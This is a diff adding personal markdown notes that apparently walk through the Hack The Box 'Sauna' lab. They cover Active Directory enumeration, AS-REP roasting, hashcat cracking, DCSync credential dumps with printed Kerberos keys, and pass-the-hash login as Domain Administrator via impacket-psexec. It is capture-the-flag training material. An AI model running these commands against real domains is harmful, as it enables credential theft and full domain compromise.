+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:adc39348ef67ea2aa8e82552638323e8e30afcc13a139d88b282c15629189696
+SAUNA$:aes128-cts-hmac-sha1-96:4ade3bf0c85a78186a009b2952bb1c13
+SAUNA$:des-cbc-md5:750875df0ee9c162
+[*] Cleaning up...
+```
+
+- Now that we have dumped the credentials, we can then access the Domain Admin account using the hash we retrieved
+
+```shell
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e "EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175"
+```
+
+- and we have Admin access on the DC
+
+![](assets/Sauna_assets/Pasted%20image%2020231114005503.png)
+
+- we can now view our root file
+
+![](assets/Sauna_assets/Pasted%20image%2020231114005542.png)
+
+
+
+
+Walkthrough
+- use boolean logic to check if the user exists using kerberos authentication
+- if kerberos replies with preauthentication required, we will know that the user exists
+- we can run crackmapexec to know about the target
+```shell
+crackmapexec smb 10.10.10.175
+```
+do `--shares`
+also try it with `-u '' -p ''`
+- do smbmap
+- rpcclient
+- We can run ldapsearch
+```shell
+ldapsearch -x -h 10.10.10.175 -s base namingcontexts
+```
+to get the 
+`DC=EGOTISTICAL-BANK,DC=LOCAL`
+- then we can do 
+```shell
+ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub
+```
+to see if we can search for usernames
+we can add `|grep sam` to the above command to see if we get any thing about usernames
+- now the names we got from the website and we will use a vim macro to process it
+```
+Fergus Smith
+Shaun Coins
+Sophie Driver
+Bowie Taylor
+Hugo Bear
+Steven Kerb
+```
+after pasting this in the text using vim, then we do `qa` which means record this macro and its gonna be on a
+we start the macro with yy to yank the line, then we do 3p (we want to edit the line we just yanked in 3 places, so it makes the first line 4)
+dw for delete word
+i for insert
+esc to exit insert mode
+q to exit recording mode
+now if we do @a,  it replays all those keys we did to them
+since we have 4 more lines we can do 4@a to repeat it 4 more times
+- kerbrute helps us do a kerberos preauthentication attack
+- kerbrute also bruteforces
+- in our vim, if we have spaces in the end of the line we can run the command
+```
+:%s/ $//g
+```
+searches for space$ ($means end of line )
+the other slash, replaces it with nothing and 
+g makes it global
+- GetNPUsers script (ASReproast) to get TGT
+- GetUserSPNs
+then crack the hash asrep$23
+```
+hashcat -m 18200 hashes/sauna /opt/wordlist/rockyou.txt
+```
+- run crackmapexec with both smb and winrm
+- privilege-escalation-awesome-scripts-suite
+- DCSync is just doing "Hey DC, i'm another DC, in order to join the domain, we need to sync passwords, so send me all the hashes"
+
+Writeup
+we can use a tool such as [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy) to create common user name permutations
+``` shell
+./username-anarchy --input-file fullnames.txt --select-format
+first,flast,first.last,firstl > unames.txt
+```
+
+- we can use a bash script and feed it the usernames for GetNPUsers like
+```bash
+while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -
+dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
+```
+- after we run our bloodhound python, we can zip it using 
+```shell
+zip info.zip *.json
+```
+then upload it to bloodhound
+- Kerberos preauth is a feature that provides protection against password guessing attacks
+- when it is not enforce one could send a dummy request for authentication
+- the KDC of the DC will check the Authentication service Request(AS-REQ), verify the user info and send a TGT
+- ASReproasting attack is to extract hash from user accounts that do not require preauth
